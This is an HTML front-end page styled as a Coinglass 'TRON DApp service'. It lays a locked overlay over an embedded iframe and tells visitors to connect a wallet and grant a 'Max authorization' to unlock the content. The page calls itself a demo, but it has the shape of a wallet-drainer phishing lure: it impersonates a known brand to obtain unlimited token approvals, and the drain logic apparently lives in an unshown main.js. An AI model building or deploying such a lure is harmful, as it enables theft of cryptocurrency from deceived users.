<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON DApp 服務 - Coinglass</title>
    <link rel="stylesheet" href="./src/style.css">
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden; /* 防止主頁面和 iframe 都出現滾動條 */
        }
        
        /* HEADER 樣式 - 確保按鈕在右上角 */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            background-color: #2c2c2c; 
            color: white;
            position: relative;
            z-index: 20; /* 確保 Header 在 iframe 和 overlay 之上 */
        }
        #connectButton {
            padding: 10px 15px;
            font-size: 1em;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background-color: #f7a600; 
            color: black;
            font-weight: bold;
        }
        #connectButton.connected {
            background-color: #28a745;
            color: white;
        }

        /* 內容區塊 - 佔滿螢幕的 iframe */
        #contentContainer {
            position: absolute;
            top: 50px; /* 留出 header 的高度 */
            left: 0;
            width: 100%;
            height: calc(100vh - 50px); /* 佔滿剩餘視窗高度 */
        }
        #coinglassFrame {
            width: 100%;
            height: 100%;
            border: none;
        }

        /* 鎖定提示覆蓋層 (取代內容解鎖邏輯) */
        #lockedPrompt {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7); /* 半透明遮罩 */
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10; /* 確保在 iframe 之上，在 header 之下 */
        }

        /* 交易狀態提示覆蓋層 (用於交易時彈出) */
        #blurOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9); 
            color: white;
            display: none; 
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 100; /* 確保在最上層 */
            backdrop-filter: blur(5px);
        }
        #overlayMessage {
            font-size: 1.5em;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <header>
        <h1>TRON 服務訂閱演示</h1>
        <button id="connectButton" title="連繫錢包">連繫錢包</button>
    </header>

    <div id="contentContainer">
        <iframe id="coinglassFrame" src="https://example.com" title="Coinglass 嵌入"></iframe>
        
        <div id="lockedPrompt">
            <h2>🔒 服務鎖定中</h2>
            <p>請點擊右上角連繫錢包並完成 **Max 授權** 以解鎖數據。</p>
            <p style="font-size: 0.8em; margin-top: 20px;">
                （Max 授權成功後，此提示將會消失）
            </p>
        </div>
    </div>
        
    <div id="blurOverlay">
        <div id="overlayMessage">連線中...</div>
    </div>

    <script src="./src/main.js"></script>
    
</body>
</html>
